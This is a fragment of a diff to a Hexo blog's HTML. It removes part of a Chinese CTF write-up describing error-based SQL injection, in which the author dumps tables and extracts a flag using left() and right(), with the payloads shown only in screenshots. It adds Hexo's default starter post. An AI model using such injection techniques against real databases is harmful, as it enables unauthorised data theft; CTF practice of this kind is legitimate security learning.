-<p>那我们试一下<br><img src="https://i.loli.net/2021/02/07/rkqzPCYHuJNn9SZ.png"></p>
-<p>确实是报错注入，那我们就接着爆tables<br><img src="https://i.loli.net/2021/02/07/uZNOi4HdKLeCAvT.png"></p>
-<p>继续爆<br><img src="https://i.loli.net/2021/02/07/L3oXdbgDtrhfNOM.png"></p>
-<p>爆出flag了，但是好像这个flag不完整，也不知道该怎么办<br><img src="https://i.loli.net/2021/02/07/OXYh78uHrdte1Gi.png"><br>看了大佬的wp才知道，可以left，right一下来把它全部爆出来</p>
-<p><img src="https://i.loli.net/2021/02/07/QTEmtVawJ3nFd9Z.png" alt="left"><br><img src="https://i.loli.net/2021/02/07/9QaP1O3LEBUjnTw.png" alt="right"></p>
-<blockquote>
-<p>得到flag！</p>
-</blockquote>
+          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 
       
     </div>
@@ -931,9 +990,6 @@
 
 
   
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
-  </nav>
 
 
 
@@ -998,9 +1054,13 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">posts</span>
         </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span>
       </div>
   </nav>
 </div>
